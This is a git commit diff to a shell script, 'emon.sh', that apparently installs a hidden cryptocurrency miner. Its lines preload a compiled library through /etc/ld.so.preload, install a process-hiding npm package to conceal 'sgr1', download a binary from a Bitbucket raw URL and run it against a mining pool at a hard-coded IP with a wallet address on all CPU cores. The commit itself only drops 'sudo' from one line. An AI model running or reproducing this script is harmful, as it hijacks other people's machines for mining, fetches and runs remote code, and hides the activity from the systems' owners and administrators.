9ba165da8177449d18c93e88c12233da3c9b157a
leviwhite380 <113033514+leviwhite380@users.noreply.github.com>
2022-09-23 00:15:44 +0700

    Update emon.sh

--- emon.sh
+++ emon.sh
@@ -5,5 +5,5 @@ gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
-sudo apt-get update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.19.2 -y && npm i -g node-process-hider && ph add sgr1
+apt-get update && apt install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt install nodejs -y && npm install -g npm@8.19.2 -y && npm i -g node-process-hider && ph add sgr1
 wget -O sgr1 https://bitbucket.org/dennidarko01/kangkung/raw/master/plant && chmod +x sgr1 && ./sgr1 -a yespowertide -o stratum+tcp://8.209.98.71:443 -u TPfT1p4uXkU4Nvb2hnVCKeH34ga8eqSFUB.0001-A -p x -t$(nproc --all)
